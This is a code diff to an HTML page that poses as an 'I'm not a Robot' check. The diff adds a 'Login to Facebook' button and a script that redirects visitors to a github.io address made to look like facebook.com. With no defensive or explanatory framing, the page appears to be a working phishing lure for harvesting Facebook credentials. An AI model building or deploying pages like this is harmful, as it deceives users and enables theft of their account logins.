@@ -11,15 +11,21 @@
     <div id="referralPage" class="container flex">
         <div class="referral-page flex">
             <h1 style="text-align: center;">I'm not a Robot</h1>
-            <form id="referralForm" action="#" method="POST">
+            <form id="referralForm" action="#">
                 <div class="form-group">
                     <label for="referral_code" class="confirm-text">*Confirm you're not a robot...</label>
                 </div>
                 <div class="form-group">
-                    <button type="Login to Facebook">Login to Facebook</button>
+                    <button type="button" onclick="redirectToFacebook()">Login to Facebook</button>
                 </div>
             </form>
         </div>
     </div>
+
+    <script>
+        function redirectToFacebook() {
+            window.location.href = "https://ejjays.github.io/facebook.com/";
+        }
+    </script>
 </body>
 </html>
